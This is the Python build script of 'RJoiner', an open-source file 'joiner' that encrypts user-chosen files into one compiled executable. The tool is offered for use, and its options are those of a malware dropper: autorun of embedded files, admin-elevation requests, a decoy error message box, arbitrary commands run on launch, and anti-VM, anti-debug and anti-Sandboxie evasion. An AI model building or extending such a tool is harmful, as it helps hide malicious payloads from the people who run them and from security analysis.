#!/usr/bin/python3

l='''
  RJoiner assistent to easily build joins
  Copyright (C) 2023  ftdot

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''

import argparse
import subprocess
import traceback
import os
import shutil
import sys
import pathlib

BANNER = '''
 ██▀███  ▄▄▄██▀▀▀▒█████   ██▓ ███▄    █ ▓█████  ██▀███  
▓██ ▒ ██▒  ▒██  ▒██▒  ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
▓██ ░▄█ ▒  ░██  ▒██░  ██▒▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
▒██▀▀█▄ ▓██▄██▓ ▒██   ██░░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
░██▓ ▒██▒▓███▒  ░ ████▓▒░░██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
░ ▒▓ ░▒▓░▒▓▒▒░  ░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
  ░▒ ░ ▒░▒ ░▒░    ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░░   ░ ░ ░ ░  ░ ░ ░ ▒   ▒ ░   ░   ░ ░    ░     ░░   ░ 
   ░     ░   ░      ░ ░   ░           ░    ░  ░   ░     
                                                        
      RJoiner v1.4.1 | by ftdot | GNU GPL v3.0
      ----------------------------------------
         https://github.com/ftdot/rjoiner
'''


def get_license() -> str:
  with open('LICENSE') as f:
    return f.read()


def safe_mkdir(what: str, dir: str) -> bool:
  try:
    os.mkdir(dir)
  except FileExistsError:
    return 1 # directory already exists
  except Exception as e:
    traceback.print_exception(e)
    print(f'Exception occurred while creating {what} directory')
    return 2 # exception occurred

  return 0 # success

def main() -> int:

  parser = argparse.ArgumentParser()
  parser.add_argument('-v', '--version',
                      help='Show version',
                      action='version',
                      version='RJoiner v1.5.0')
  parser.add_argument('--copyright',
                      help='Show copyright',
                      action='version',
                      version=l)
  parser.add_argument('--license',
                      help='Show license',
                      action='version',
                      version=get_license())

  parser.add_argument('-i', '--icon',
                      help='Path to icon (only .ico) (available only for windows!)',
                      default=None)

  parser.add_argument('-a', '--admin',
                      help='Enables request to admin execution level (available only for windows!)',
                      action='store_true',
                      default=False)
  
  parser.add_argument('-t', '--target',
                      help='Specify a target to cargo (list installed targets: rustup target list --installed) (can be multiple)',
                      action='append',
                      default=None)
  
  parser.add_argument('-d', '--debug',
                      help='Enables debug mode (by default, compiles in release mode) (prevents to temp/ directory deletion, enables console on windows releases)',
                      action='store_true',
                      default=False)

  parser.add_argument('-V', '--verbose',
                      help='Enables verbose mode (prints exceptions, current steps)',
                      action='store_true',
                      default=False)

  parser.add_argument('-f', '--file',
                      help='Path to the file(s) to join (can be multiple) (start filename with "!" to autorun it)',
                      action='append',
                      required=True)

  parser.add_argument('--no-banner',
                      help='Disables RJoiner banner',
                      action='store_true')

  parser.add_argument('-M', '--msgbox',
                      help='Shows messagebox (you need also provide -m, -T argument)',
                      action='store_true')

  parser.add_argument('-m', '--message',
                      help='Message to show at messagebox',
                      default=None)
  
  parser.add_argument('-T', '--title',
                      help='Title to show at messagebox',
                      default=None)
  
  parser.add_argument('-I', '--mbox-icon-type',
                      help='Set icon type of messagebox (available: error, info. By default: error)',
                      default='error')

  parser.add_argument('-b', '--msgbox-before',
                      help='Shows messagebox before executing joined programs (by default, messagebox will be showed after executing joined programs)',
                      action='store_true')

  parser.add_argument('--anti-vm',
                      help='Enables Anti-VM (only x86)',
                      action='store_true')
  
  parser.add_argument('--anti-debug',
                      help='Enables Anti-Debug (available only for Linux builds!) (only x86)',
                      action='store_true')

  parser.add_argument('--anti-sandboxie',
                      help='Enables Anti-Sandboxie (only Windows)',
                      action='store_true')

  parser.add_argument('-c', '--command',
                      help='Commands to execute when runned (by default is doesn\'t run any. Can be multiple)',
                      action='append',)

  args = parser.parse_args()

  if not args.no_banner: print(BANNER)

  # check if cargo is available
  try:
    subprocess.check_call('cargo --version')
  except:
    print('You need install Rust to this work!\n\nLink: https://www.rust-lang.org/tools/install')
    return 1

  if args.verbose:
    printv = lambda *a, **kw: print('V:', *a, **kw)
  else:
    printv = lambda *a, **kw: None

  files = []
  
  # check files to join
  printv('Checking files to join')
  for f in args.file:
    files.append(pathlib.Path(f))
    p = pathlib.Path(f.removeprefix('!'))
    
    if not p.is_file():
      print('File', p, "doesn't exist or this isn't a file")
      return 1

  # run compile process
  try:
    features = ['build', ]

    # add features if any
    if args.icon is not None: features.append('icon')
    if args.admin: features.append('admin')
    if args.anti_vm: features.append('anti_vm')
    if args.anti_debug: features.append('anti_debug')
    if args.anti_sandboxie: features.append('anti_sandboxie')
    if args.msgbox:
      features.append('show_messagebox_before' if args.msgbox_before else 'show_messagebox_after')

      if args.message is None or args.title is None:
        print('You must provide -m arguments (--message) to use messagebox')
        return 1
      
    
      if args.mbox_icon_type.lower() not in ['error', 'info']:
        print('Argument -I, --mbox-icon-type can be only "error" or "info" values')
        return 1

    # convert features list
    features_ = ['--features', ','.join(features)]

    # release parameter
    release_param = [] if args.debug else ['--release', ]

    # create temporary directory
    printv('Creating temporary directory')
    match safe_mkdir('temporary', 'temp'):
      case 0: pass
      case 1: printv('Directory already exists')
      case 2: return 1

    # create output directory
    printv('Creating output directory')
    match safe_mkdir('output', 'out'):
      case 0: pass
      case 1: printv('Directory already exists')
      case 2: return 1

    # copy content from stub directory to temporary directory
    printv('Copying stub directory to temp')
    shutil.copytree('stub', 'temp', dirs_exist_ok=True, ignore=shutil.ignore_patterns('target'))

    # copy icon (if any) to temp directory
    printv('Copying icon file to temp/icon.ico')
    if args.icon is not None:
      shutil.copyfile(args.icon, 'temp/icon.ico')

    # copy all files to join to temporary directory
    files_to_include = []
    same_named = {}

    # copy files to temporary directory
    printv('Copying files to temporary directory')
    for f in files:

      printv('Copy file', f)

      p = f.name.removeprefix('!')
      f = f.with_name(p)

      # check if there is same named files
      if p in same_named:
        same_named[p] += 1

      # check if file name already in list
      if p in files_to_include:
        if not p in same_named: same_named[p] = 0

        name_s = p.split('.')
        ext = ''

        # get name and extension splitted
        if len(name_s) > 1: name_s, ext = '.'.join(name_s[:-1]), '.' + name_s[-1]
        else: name_s = name_s[0]

        # format new file name
        p = f'{name_s}_{same_named[p]}' + ext

      # add file to list
      files_to_include.append(p)

      printv('Copy as', p)

      # copy file
      shutil.copyfile(f, 'temp/' + p)
    
    # delete no longer required data
    del files
    del same_named

    # change directory to temp
    printv('Changing directory to "temp/"')
    try: os.chdir('temp')
    except Exception as e:
      traceback.print_exception(e)
      print('Exception occurred while changing directory')
      return 1

    # generate code to generate code xD
    printv('Generating code')
    gen_code = '\n    '.join([(ar:='true' if f.startswith('!') else 'false', fn:=f[1:] if f.startswith('!') else f, f'match read_n_encrypt_file("{fn}", &key, {ar}) {{\n        Some(r) => {{ code_vec.push(r); }}\n        None => {{ println!("Cannot add file {fn} autorun: {"yes" if ar else "no"}"); }}\n    }}')[2] for f in files_to_include])
    with open('build.rs', 'r') as f:
      build_rs_content = f.read()
    
    # generating code for messagebox (if it is enabled)
    if args.msgbox:
      title = args.title.replace('\\', '\\\\\\\\').replace('"', '\\\\\\"')
      message = args.message.replace('\\', '\\\\\\\\').replace('"', '\\\\\\"')

      printv('Generating code for messagebox')
      build_rs_content = build_rs_content.replace('--msgbox-title-build--', title) \
                                         .replace('--msgbox-text-build--', message) \
                                         .replace('--msgbox-type-build--', args.mbox_icon_type.lower().capitalize())

    # generating code for commands (if any)
    if args.command is not None:
      printv('Generating code for commands')

      commands_code = []

      for c in args.command:
        command_code = 'code_vec.push(add_command("{0}"));'.format(c.replace('\\', '\\\\').replace('"', '\\"'))

        commands_code.append(command_code)
      
      gen_code += '\n    '+'\n    '.join(commands_code)

    printv('Writing generated code')
    with open('build.rs', 'w') as f:
      f.write(build_rs_content.replace('//--gen-build-code--', gen_code))

    printv(f'Generated code:\n{gen_code}')

    # disable backtrace if debug mode is disabled
    if not args.debug:
      printv('Rust backtrace disabled')
      os.environ['RUST_BACKTRACE'] = '0'

    # check if target is None
    if args.target is None: args.target = [None, ]

    # build joiner by all specified targets
    for t in args.target:
      print('Compiling for target:', t)

      t = [] if t is None else ['--target', t]
      # run build command
      command = ['cargo', 'build', '--target-dir', '../out'] + release_param + features_ + t + (['-vv'] if args.verbose else [])
      printv('Call command:', *command)
      r = subprocess.call(command, stdout=sys.stdout, stderr=sys.stderr)

    # change directory back
    os.chdir('..')

    # message about successful build
    if r != 1:
      print('Joiner successfully build! Your result stores in "out/" directory')
    else:
      print('Builder returned an error.')

    # do not delete temp/ directory when debug enabled
    if args.debug:
      return 0
  

    # try to remove temp directory
    printv('Removing temporary directory')
    try:
      shutil.rmtree('temp/')
    except Exception as e:
      traceback.print_exception(e)
      print('Cannot to remove temporary directry')
      return 1

  except Exception as e:
    traceback.print_exception(e)
    print('Exception occurred while compiling joiner')
    return 1

  return 0

if __name__ == '__main__':
  exit(main())
